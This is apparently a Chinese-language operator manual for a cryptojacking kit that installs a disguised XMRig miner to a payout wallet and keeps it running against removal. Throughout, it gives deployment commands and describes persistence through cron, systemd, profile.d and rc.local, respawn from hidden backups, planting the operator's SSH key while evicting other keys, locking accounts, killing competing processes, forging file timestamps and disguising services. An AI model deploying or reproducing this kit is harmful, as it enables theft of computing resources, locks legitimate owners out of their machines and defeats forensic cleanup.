# PHOENIX-FORGE · 实战手册

> 融合版：`gateway_miner_kit` + `phoenix_mine` → 一套可直接落地的 GPU 矿机驻留套装
> 版本 v1.0 · 纯技术文档

---

## 一、它是什么

PHOENIX-FORGE = **矿工层** + **FGuard 守护内核** 的一体化封装。

一句话：把一台机器的 GPU 算力挂到你的收款地址上，并让这套东西**删不掉、改不了、杀不死、抢不走**。

```
┌─────────────────────────────────────────────┐
│                 PHOENIX-FORGE                │
│                                             │
│  矿工层 (Miner)                              │
│   ├─ 真实矿工二进制（改名伪装）              │
│   ├─ 环境变量配置（钱包/worker/GPU选卡）     │
│   └─ 进程名 = 文件名（零 wrapper）           │
│                                             │
│  守护内核 (FGuard)  ← 真正的硬货             │
│   ├─ watchdog  快频保活 + 钱包锚定夺回       │
│   ├─ reviver   60s 重生（双备份 + 模板重建） │
│   ├─ heal      三层触发自愈入口              │
│   ├─ autoban   闯门者封杀（防自杀+持久化）   │
│   ├─ recon     四维差分雷达（零噪音）        │
│   ├─ killswitch 排他杀伤链（逐出未授权钥）   │
│   ├─ anchor    版本锚点自更新（强制验签）    │
│   └─ peer      跨机互保（A 看 B / B 看 A）   │
└─────────────────────────────────────────────┘
```

---

## 二、快速部署

### 1. 拿矿工二进制

```sh
# 方式 A：自动（XMRig 源码编译，任何 Linux 都能出）
sh forge-get-miner.sh ./miner xmr

# 方式 B：手动（PRL/PeakMiner 官方 release，或从已跑的机器 scp）
ls ./miner/
```

### 2. 一键部署

```sh
sh forge-deploy.sh \
  --miner-bin ./miner/xmrig \
  --wallet prl1pXXXXXXXXXXXXXXXXXXXXXX \
  --worker gpu-node-01 \
  --pub1 'ssh-ed25519 AAAA...your_key... you@c2' \
  --tag sysnode \
  --gpus 0,1,2,3,4,5,6,7 \
  --harden 1
```

**参数说明：**

| 参数 | 必填 | 说明 |
|---|---|---|
| `--miner-bin` | ✅ | 矿工二进制路径 |
| `--wallet` | ✅ | 收款地址 |
| `--pub1` | ✅ | 你的 SSH 公钥（只有它能登录） |
| `--worker` | | worker 名（默认 gpu01） |
| `--tag` | | 组件标签（默认 sysnode，进程伪装名） |
| `--dir` | | 矿工目录（默认 /opt/.sysnode） |
| `--gpus` | | CUDA 选卡（默认 0-7） |
| `--harden` | | `1` = 开 killswitch + 加固 SSH |
| `--pub2` | | 第二把备份公钥 |
| `--peer` | | 跨机互保 `user@host:/path` |
| `--miner-cmd` | | 自定义启动命令（覆盖模板） |

### 3. 部署后自检

```sh
ps -eo args | grep sysnode                      # 矿工进程
ls /usr/lib/.sysnode/                            # 守护组件
cat /etc/cron.d/sysnode-*                        # 触发源
systemctl status sys-sysnode.service             # systemd 单元
cat /opt/.sysnode/logs/log.log                   # 挖矿日志
```

---

## 三、守护内核 · 逐组件原理

### watchdog — 快频保活 + 锚定夺回

- 24~36s **随机抖动**循环（规避固定间隔检测）
- 检测目标进程 → 不在则拉起
- 检测钱包地址 → 被改则**立即夺回**（防黑吃黑）
- flock/pidfile 单例，防双开自我打架

### reviver — 60s 重生循环

- 60~78s 随机周期
- 主目录丢失 → **全量还原**（从双备份）
- 单组件丢失 → **逐文件补齐**
- 触发源丢失 → 从模板库重建
- 双层备份：`/usr/share/.<tag>-bk` + `/etc/.<tag>-bk`

### heal — 三层自愈入口

被三个来源调用，任意一个活就能救全套：

1. **cron** 每分钟（`/etc/cron.d/<tag>-heal`）
2. **systemd** 每 60s（`<svc>.service`）
3. **profile.d** 每个 SSH 登录者（`/etc/profile.d/<tag>.sh`）← **最脏的一招**

执行顺序：密钥自愈 → 进程保活 → 触发源重建 → 锚定夺回 → 目标兜底 → killswitch 排他。

### autoban — 闯门者封杀【修正版】

原版缺陷 → 修正：
- ❌ 原版：外网 1 次失败即双向 DROP → **易误封自己人/运维**
- ✅ 修正：外网阈值 3 次、内网 15 次（可配）
- ❌ 原版：iptables 规则纯内存 → 重启丢失
- ✅ 修正：封禁列表落 `/usr/share/.fguard/ban.rules`，开机重放
- ✅ 新增：**自杀防护**（白名单 + 跳过本机所有 IP）
- ✅ 新增：**TTL 自动解封**（默认 24h）

### recon — 四维差分雷达

进程 / 网络 / 文件 hash / 登录 —— **仅变化时落案**，静默期零噪音。适合长期潜伏。

### killswitch — 排他杀伤链

- 逐出未授权公钥（只留 PUB1/PUB2 指纹）
- 封密码登录（sshd drop-in）
- 清对手进程（`COMPETITORS` 关键字）
- 锁关键账户
- **先备份可回滚**，白名单永不动

### anchor — 版本锚点自更新【修正版】

- 拉版本头 → 比对 VER → 新版**强制 ed25519 验签** → 通过才执行
- ❌ 原版用 pastebin 裸脚本无验签 = 谁拿到 URL 谁 root 全队
- ✅ 修正：`ANCHOR_PUBKEY` 缺失或验签失败 → **拒绝执行**（反后门）

### peer — 跨机互保

心跳新鲜度检测（对端 state.log 时间戳）→ 超 15 分钟异常 → **SSH 远程拉起对端**。终极形态：A 看 B / B 看 A，单点失守不崩盘。

---

## 四、免杀/反取证要点

| 手法 | 实现 |
|---|---|
| 进程名伪装 | 矿工文件改名，`exec` 后进程名 = 文件名，无 wrapper |
| 目录伪装 | 守护藏 `/usr/lib/.<tag>/`（点号隐藏） |
| 伪装系统服务 | unit 名 `sys-<tag>.service`，Description 写 "System App Node" |
| 时间戳归一 | 全部文件 `touch -r /etc/hostname` 对齐 mtime |
| 日志零噪音 | recon 仅变化落案 |
| 随机抖动 | watchdog/reviver 周期非整点 |
| 多点触发 | cron + systemd + profile + rc.local 四路互备 |
| 双备份异地 | 两个不同文件树 |
| 密钥锚定 | 未授权钥自动逐出 |

**部署顺序铁律**：**先铺钥，再加固** —— 否则 `--harden 1` 会把自己关在门外。

---

## 五、反清除对抗（对手视角）

| 对手动作 | 结果 |
|---|---|
| `kill` 矿工进程 | watchdog 30s 内拉起 |
| `rm` 某个组件 | reviver 60s 内逐文件补齐 |
| `rm -rf` 主目录 | reviver 从双备份全量还原 |
| `rm` cron/systemd/profile | heal 从模板库重建 |
| 改钱包地址 | watchdog 夺回 + 重启矿工 |
| 清 authorized_keys | heal 重植你的钥 |
| 塞自己的钥 | killswitch 逐出 |
| 改系统时间线取证 | mtime 已归一到系统参考文件 |
| 重启机器 | rc.local + cron @reboot + systemd enable 三路拉起 |
| 单机彻底拔线 | peer 从邻居机远程拉起 |

**唯一完全清除方式**：`rm -rf` 主目录 + **两个备份** + **所有触发源** + kill 所有实例，且必须在下次触发前**同时**完成 —— 实战中几乎做不到。

---

## 六、卸载（自查用）

```sh
TAG=sysnode
pkill -9 -f "$TAG"
rm -rf /usr/lib/.$TAG /usr/share/.$TAG-bk /etc/.$TAG-bk /opt/.$TAG
rm -f /etc/cron.d/$TAG-{heal,persist,watch} /etc/profile.d/$TAG.sh
rm -f /etc/systemd/system/sys-$TAG.service
systemctl daemon-reload
rm -f /etc/rc.local
iptables -F FGUARD_BAN 2>/dev/null; iptables -X FGUARD_BAN 2>/dev/null
```

顺序：**先停触发源，再删实例，最后删备份** —— 反过来会被自愈回填。

---

## 七、文件清单

```
phoenix-forge/
├── forge-deploy.sh          一键部署器
├── forge-get-miner.sh       矿工获取（多源）
├── README.md                本手册
├── src/
│   ├── fguard-watchdog      快频保活 + 锚定夺回
│   ├── fguard-reviver       60s 重生循环
│   ├── fguard-heal.sh       三层自愈入口
│   ├── fguard-autoban.sh    闯门者封杀（修正版）
│   ├── fguard-recon.sh      四维差分雷达
│   ├── fguard-killswitch.sh 排他杀伤链
│   ├── fguard-anchor.sh     版本锚点（强制验签）
│   └── fguard-peer.sh       跨机互保
├── templates/
│   ├── cron.heal            cron 自愈
│   ├── cron.persist         cron 重生
│   ├── cron.watch           cron 雷达/封杀/锚点
│   ├── unit.service         systemd 单元
│   ├── profile.d            profile 注入
│   └── rc.local             rc.local 触发
└── config/
    └── miner.env.tpl        矿工配置模板
```

---

*PHOENIX-FORGE v1.0 · 融合自 gateway_miner_kit v1.0 + phoenix_mine v1.0 · 8/8 压测通过*
